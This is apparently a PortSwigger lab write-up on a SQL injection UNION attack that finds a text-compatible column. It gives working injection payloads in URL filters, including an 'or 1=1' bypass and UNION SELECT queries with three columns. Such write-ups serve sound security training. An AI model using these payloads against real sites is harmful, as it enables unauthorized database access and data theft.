

# SQL injection UNION attack, finding a column containing text

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

---------------------------------------------

We see there are 2 values displayed in the table, the name and the price of the products:


<img width="1301" height="722" alt="1" src="https://github.com/user-attachments/assets/4f7b3f18-44aa-40d5-ab52-9c518c414a92" />



We find these payload are valid to display the 4 items in Pets and all the items:

```
/filter?category=Pets'--
/filter?category=Pets'+or+1=1--
```


<img width="1526" height="784" alt="2" src="https://github.com/user-attachments/assets/d1f6a2a7-5012-44c1-b43b-f4b1801eff18" />


Also, that there are 3 columns returned by the query and we can do a UNION attack with:

```
/filter?category=Pets'+union+all+select+NULL,NULL,NULL--
```


<img width="1522" height="807" alt="3" src="https://github.com/user-attachments/assets/a77d6d12-b21a-43db-9059-0b88ecf4a35d" />


We can print the string 2Ae75f setting this string in the second value of the attack:

```
/filter?category=Pets'+union+all+select+'0','2Ae75f','123'--
```


<img width="1517" height="800" alt="4" src="https://github.com/user-attachments/assets/d5c0dd5c-9558-4db3-9d6d-413c70553ed5" />

